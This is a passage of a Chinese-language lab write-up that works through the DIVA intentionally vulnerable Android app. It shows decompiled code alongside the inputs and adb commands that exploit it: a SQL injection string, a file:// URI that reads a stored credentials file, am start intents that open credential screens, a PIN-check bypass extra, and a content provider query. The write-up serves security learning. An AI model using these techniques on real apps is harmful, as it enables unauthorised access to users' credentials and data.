   <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mDB = <span class="built_in">this</span>.openOrCreateDatabase(<span class="string">&quot;sqli&quot;</span>, <span class="number">0</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;DROP TABLE IF EXISTS sqliuser;&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;CREATE TABLE IF NOT EXISTS sqliuser(user VARCHAR, password VARCHAR, credit_card VARCHAR);&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;INSERT INTO sqliuser VALUES (\&#x27;admin\&#x27;, \&#x27;passwd123\&#x27;, \&#x27;1234567812345678\&#x27;);&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;INSERT INTO sqliuser VALUES (\&#x27;diva\&#x27;, \&#x27;p@ssword\&#x27;, \&#x27;1111222233334444\&#x27;);&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;INSERT INTO sqliuser VALUES (\&#x27;john\&#x27;, \&#x27;password123\&#x27;, \&#x27;5555666677778888\&#x27;);&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;Diva-sqli&quot;</span>, <span class="string">&quot;Error occurred while creating database for SQLI: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040029</span>);  <span class="comment">// layout:activity_sqlinjection</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">search</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">srchtxt</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0099</span>);  <span class="comment">// id:ivi1search</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Cursor</span> <span class="variable">cursor0</span> <span class="operator">=</span> <span class="built_in">this</span>.mDB.rawQuery(<span class="string">&quot;SELECT * FROM sqliuser WHERE user = \&#x27;&quot;</span> + srchtxt.getText().toString() + <span class="string">&quot;\&#x27;&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">strb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(cursor0 != <span class="literal">null</span> &amp;&amp; cursor0.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                cursor0.moveToFirst();</span><br><span class="line">                <span class="keyword">do</span> &#123;</span><br><span class="line">                    strb.append(<span class="string">&quot;User: (&quot;</span> + cursor0.getString(<span class="number">0</span>) + <span class="string">&quot;) pass: (&quot;</span> + cursor0.getString(<span class="number">1</span>) + <span class="string">&quot;) Credit card: (&quot;</span> + cursor0.getString(<span class="number">2</span>) + <span class="string">&quot;)\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span>(cursor0.moveToNext());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                strb.append(<span class="string">&quot;User: (&quot;</span> + srchtxt.getText().toString() + <span class="string">&quot;) not found&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, strb.toString(), <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;Diva-sqli&quot;</span>, <span class="string">&quot;Error occurred while searching in database: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1‘ or 1=1</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230325182536117.png" alt="image-20230325182536117"></p>
<h2 id="输入校验问题—第二部分"><a href="#输入校验问题—第二部分" class="headerlink" title="输入校验问题—第二部分"></a>输入校验问题—第二部分</h2><p>代码:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InputValidation2URISchemeActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">get</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">uriText</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0081</span>);  <span class="comment">// id:ivi2uri</span></span><br><span class="line">        ((WebView)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0083</span>)).loadUrl(uriText.getText().toString());  <span class="comment">// id:ivi2wview</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040021</span>);  <span class="comment">// layout:activity_input_validation2_urischeme</span></span><br><span class="line">        ((WebView)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0083</span>)).getSettings().setJavaScriptEnabled(<span class="literal">true</span>);  <span class="comment">// id:ivi2wview</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将http协议换成File协议，查看之前存储在sd卡的账号文件</p>
<p>输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///mnt/sdcard/.uinfo.txt</span><br></pre></td></tr></table></figure>

<h3 id="webview域控制不严格漏洞"><a href="#webview域控制不严格漏洞" class="headerlink" title="webview域控制不严格漏洞"></a>webview域控制不严格漏洞</h3><p>先看Android里的WebViewActivity.java，当其他应用启动此 Activity 时， intent 中的 data 直接被当作 url 来加载（假定传进来的 url 为 file:&#x2F;&#x2F;&#x2F;data&#x2F;local&#x2F;tmp&#x2F;attack.html ），其他 APP 通过使用显式 ComponentName 或者其他类似方式就可以很轻松的启动该WebViewActivity 并加载恶意url。</p>
<p>解决方案：</p>
<p>对于不需要使用 file 协议的应用，禁用 file 协议.</p>
<p>对于需要使用 file 协议的应用，禁止 file 协议加载 JavaScript。</p>
<p>方法分析：</p>
<p>1、setAllowFileAccess()<br>使用 file 域加载的 js代码能够使用进行同源策略跨域访问，从而导致隐私信息泄露，如果不允许使用 file 协议，则不会存在上述的威胁，但同时也限制了 WebView 的功能，使其不能加载本地的 html 文件。</p>
<p>2、setAllowFileAccessFromFileURLs()<br>设置为false，禁止从 file url 中加载的 js 代码读取其它本地文件，在Android 4.1前默认允许，在Android 4.1后默认禁止。</p>
<p>3、setAllowUniversalAccessFromFileURLs()<br>设置为false，禁止从 file url 中加载的 js 代码可以访问其他的源(包括http、https等源)。</p>
<h2 id="访问控制问题—第一部分"><a href="#访问控制问题—第一部分" class="headerlink" title="访问控制问题—第一部分"></a>访问控制问题—第一部分</h2><p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AccessControl1Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040019</span>);  <span class="comment">// layout:activity_access_control1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">viewAPICredentials</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        i.setAction(<span class="string">&quot;jakhar.aseem.diva.action.VIEW_CREDS&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(i.resolveActivity(<span class="built_in">this</span>.getPackageManager()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.startActivity(i);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Error while getting API details&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        Log.e(<span class="string">&quot;Diva-aci1&quot;</span>, <span class="string">&quot;Couldn\&#x27;t resolve the Intent VIEW_CREDS to our activity&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@shamu:/ # am start jakhar.aseem.diva/.APICredsActivity</span><br><span class="line">Starting: Intent &#123; act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] cmp=jakhar.aseem.diva/.APICredsActivity &#125;</span><br><span class="line"></span><br><span class="line">am start -n jakhar.aseem.diva/jakhar.aseem.diva.APICredsActivity</span><br><span class="line">am start -n jakhar.aseem.diva/.APICredsActivity -a jakhar.aseem.diva.action.VIEW_CREDS</span><br></pre></td></tr></table></figure>

<p>对应解释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">中文解释下：am start jakhar.aseem.diva/.APICredsActivity</span><br><span class="line">这是一个Android系统中的命令，用于启动一个应用程序的特定活动（Activity）。其中，“am”代表Activity Manager，它是一个管理Android应用程序中活动（Activity）的系统服务。</span><br><span class="line">具体来说，“start”是am命令的一种操作类型，用于启动一个活动。接下来是“jakhar.aseem.diva”，它代表应用程序的包名，即Diva应用程序的包名。最后是“/.APICredsActivity”，它代表要启动的具体活动名称，即APICredsActivity。因此，该命令的含义是启动名为APICredsActivity的Diva应用程序活动。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">为什么/.APICredsActivity 有个点</span><br><span class="line">在 Android 中，点号（.）在活动（Activity）名称前面表示该活动是应用程序的子活动，即它是在包含该活动的应用程序的命名空间中定义的。因此，点号（.）后面跟着的是子活动的名称，而不是完整的活动类名。这样可以简化指定活动名称的过程，并使活动名称更具可读性。</span><br><span class="line">在这个例子中，由于点号（.）在活动名称前面，因此它表示 APICredsActivity 是 Diva 应用程序的子活动，即该活动是在 Diva 应用程序的命名空间中定义的。这样就不需要指定完整的活动类名，只需指定子活动名称即可。</span><br><span class="line"></span><br><span class="line">如果不使用点号，那么在命令中应该指定完整的活动类名。例如，如果要启动 Diva 应用程序中的 APICredsActivity，可以使用以下命令：</span><br><span class="line">am start -n jakhar.aseem.diva/jakhar.aseem.diva.APICredsActivity</span><br><span class="line">其中，“-n”选项用于指定要启动的活动的完整类名，其中包括应用程序包名和活动名称。所以，上面的命令将启动 jakhar.aseem.diva 应用程序中的 jakhar.aseem.diva.APICredsActivity 活动。</span><br></pre></td></tr></table></figure>

<h2 id="访问控制问题—第二部分"><a href="#访问控制问题—第二部分" class="headerlink" title="访问控制问题—第二部分"></a>访问控制问题—第二部分</h2><p>代码：</p>
<p>accesscontrolaction：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.RadioButton;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AccessControl2Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F04001A</span>);  <span class="comment">// layout:activity_access_control2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">viewAPICredentials</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">RadioButton</span> <span class="variable">rbregnow</span> <span class="operator">=</span> (RadioButton)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C006D</span>);  <span class="comment">// id:aci2rbregnow</span></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">z</span> <span class="operator">=</span> rbregnow.isChecked();</span><br><span class="line">        i.setAction(<span class="string">&quot;jakhar.aseem.diva.action.VIEW_CREDS2&quot;</span>);</span><br><span class="line">        i.putExtra(<span class="built_in">this</span>.getString(<span class="number">0x7F060026</span>), ((<span class="type">boolean</span>)(((<span class="type">int</span>)z))));  <span class="comment">// string:chk_pin &quot;check_pin&quot;</span></span><br><span class="line">        <span class="keyword">if</span>(i.resolveActivity(<span class="built_in">this</span>.getPackageManager()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.startActivity(i);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Error while getting Tveeter API details&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        Log.e(<span class="string">&quot;Diva-aci1&quot;</span>, <span class="string">&quot;Couldn\&#x27;t resolve the Intent VIEW_CREDS2 to our activity&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>API ：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">APICreds2Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F04001E</span>);  <span class="comment">// layout:activity_apicreds2</span></span><br><span class="line">        <span class="type">TextView</span> <span class="variable">apicview</span> <span class="operator">=</span> (TextView)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0077</span>);  <span class="comment">// id:apic2TextView</span></span><br><span class="line">        <span class="type">EditText</span> <span class="variable">pintext</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0078</span>);  <span class="comment">// id:aci2pinText</span></span><br><span class="line">        <span class="type">Button</span> <span class="variable">vbutton</span> <span class="operator">=</span> (Button)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0079</span>);  <span class="comment">// id:aci2button</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">this</span>.getIntent().getBooleanExtra(<span class="built_in">this</span>.getString(<span class="number">0x7F060026</span>), <span class="literal">true</span>)) &#123;  <span class="comment">// string:chk_pin &quot;check_pin&quot;</span></span><br><span class="line">            apicview.setText(<span class="string">&quot;TVEETER API Key: secrettveeterapikey\nAPI User name: diva2\nAPI Password: p@ssword2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        apicview.setText(<span class="string">&quot;Register yourself at http://payatu.com to get your PIN and then login with that PIN!&quot;</span>);</span><br><span class="line">        pintext.setVisibility(<span class="number">0</span>);</span><br><span class="line">        vbutton.setVisibility(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">viewCreds</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Invalid PIN. Please try again&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>试下使用老套路：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell am start -n jakhar.aseem.diva/.APICreds2Activity -a jakhar.aseem.diva.action.VIEW_CREDS2</span><br></pre></td></tr></table></figure>

<p>失败</p>
<p>过程：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell am start -a jakhar.aseem.diva.action.VIEW_CREDS2 -n jakhar.aseem.diva/.APICreds2Activity --ez check_pin false</span><br></pre></td></tr></table></figure>

<p>解释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解释下：adb shell am start -a jakhar.aseem.diva.action.VIEW_CREDS2 -n jakhar.aseem.diva/.APICreds2Activity --ez check_pin false</span><br><span class="line"></span><br><span class="line">这是一个 Android adb shell 命令，它用于在 Diva 应用程序中启动 APICreds2Activity 活动，并传递一些参数。下面对该命令的各个部分进行解释：</span><br><span class="line"></span><br><span class="line">adb shell</span><br><span class="line">这是一个命令行工具，可以在 Android 设备的 shell 终端中运行命令。</span><br><span class="line"></span><br><span class="line">am start</span><br><span class="line">这是一个 Android shell 命令，用于启动一个活动。在这个命令中，通过指定“-a”选项和“-n”选项来指定要启动的活动。</span><br><span class="line"></span><br><span class="line">-a jakhar.aseem.diva.action.VIEW_CREDS2</span><br><span class="line">这个选项指定要启动的活动的 Action，即 jakhar.aseem.diva.action.VIEW_CREDS2。这是一个自定义的 Action，用于指示要启动的是 APICreds2Activity 活动。</span><br><span class="line"></span><br><span class="line">-n jakhar.aseem.diva/.APICreds2Activity</span><br><span class="line">这个选项指定要启动的活动的 ComponentName，即 jakhar.aseem.diva/.APICreds2Activity。其中，jakhar.aseem.diva 是应用程序的包名，APICreds2Activity 是要启动的活动的类名。</span><br><span class="line"></span><br><span class="line">--ez check_pin false</span><br><span class="line">这个选项用于传递一个额外参数给 APICreds2Activity 活动。其中，check_pin 是一个布尔类型的参数名，表示是否需要检查输入的 PIN 码是否正确。false 表示不需要检查。这个参数将在 APICreds2Activity 的 onCreate 方法中被使用，以确定显示哪种类型的凭据信息。</span><br><span class="line"></span><br><span class="line">综上所述，这个命令的作用是启动 Diva 应用程序中的 APICreds2Activity 活动，并传递一个额外参数，以确定显示哪种类型的凭据信息。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这是什么意思：i.setAction(&quot;jakhar.aseem.diva.action.VIEW_CREDS2&quot;);</span><br><span class="line">这段代码是在创建一个 Intent 对象，并使用 setAction() 方法设置了它的 Action 属性为 &quot;jakhar.aseem.diva.action.VIEW_CREDS2&quot;。这个 Action 是自定义的，用于指示要启动 Diva 应用程序中的 APICreds2Activity 活动。可以使用这个 Intent 对象来启动相应的活动或服务。</span><br></pre></td></tr></table></figure>



<h2 id="访问控制问题—第三部分"><a href="#访问控制问题—第三部分" class="headerlink" title="访问控制问题—第三部分"></a>访问控制问题—第三部分</h2><p>代码：</p>
<p>activity：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.content.SharedPreferences.Editor;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.preference.PreferenceManager;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AccessControl3Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addPin</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        SharedPreferences.<span class="type">Editor</span> <span class="variable">sharedPreferences$Editor0</span> <span class="operator">=</span> PreferenceManager.getDefaultSharedPreferences(<span class="built_in">this</span>).edit();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> ((EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0070</span>)).getText().toString();  <span class="comment">// id:aci3Pin</span></span><br><span class="line">        <span class="keyword">if</span>(s == <span class="literal">null</span> || (s.isEmpty())) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Please Enter a valid pin!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Button</span> <span class="variable">vbutton</span> <span class="operator">=</span> (Button)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0072</span>);  <span class="comment">// id:aci3viewbutton</span></span><br><span class="line">        sharedPreferences$Editor0.putString(<span class="built_in">this</span>.getString(<span class="number">0x7F06004A</span>), s);  <span class="comment">// string:pkey &quot;notespin&quot;</span></span><br><span class="line">        sharedPreferences$Editor0.commit();</span><br><span class="line">        <span class="keyword">if</span>(vbutton.getVisibility() != <span class="number">0</span>) &#123;</span><br><span class="line">            vbutton.setVisibility(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;PIN Created successfully. Private notes are now protected with PIN&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">goToNotes</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.startActivity(<span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, AccessControl3NotesActivity.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F04001B</span>);  <span class="comment">// layout:activity_access_control3</span></span><br><span class="line">        <span class="keyword">if</span>(!PreferenceManager.getDefaultSharedPreferences(<span class="built_in">this</span>).getString(<span class="built_in">this</span>.getString(<span class="number">0x7F06004A</span>), <span class="string">&quot;&quot;</span>).isEmpty()) &#123;  <span class="comment">// string:pkey &quot;notespin&quot;</span></span><br><span class="line">            ((Button)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0072</span>)).setVisibility(<span class="number">0</span>);  <span class="comment">// id:aci3viewbutton</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>xml文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:authorities</span>=<span class="string">&quot;jakhar.aseem.diva.provider.notesprovider&quot;</span> <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;jakhar.aseem.diva.NotesProvider&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里使用了ContentProvider，android:enabled表示是否能由系统初始化，android:exported表示是否能被其他应用使用，android:authorities标识这个ContentProvider，调用者可以根据这个标识来找到它，看到2个值都为true，我们就可以使用content:&#x2F;&#x2F;访问里面的数据了，查看包含content:&#x2F;&#x2F;的字符串文件apktool&#x2F;diva-beta&#x2F;smali&#x2F;jakhar&#x2F;aseem&#x2F;diva&#x2F;NotesProvider.smali。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell content query –-uri content://jakhar.aseem.diva.provider.notesprovider/notes</span><br></pre></td></tr></table></figure>

<p>没太懂这里，以后需要深入了解安卓再来学学。</p>
<h2 id="硬编码—第二部分"><a href="#硬编码—第二部分" class="headerlink" title="硬编码—第二部分"></a>硬编码—第二部分</h2><p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hardcode2Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> DivaJni djni;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">access</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">hckey</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C007E</span>);  <span class="comment">// id:hc2Key</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.djni.access(hckey.getText().toString()) != <span class="number">0</span>) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Access granted! See you on the other side :)&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Access denied! See you in hell :D&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040020</span>);  <span class="comment">// layout:activity_hardcode2</span></span><br><span class="line">        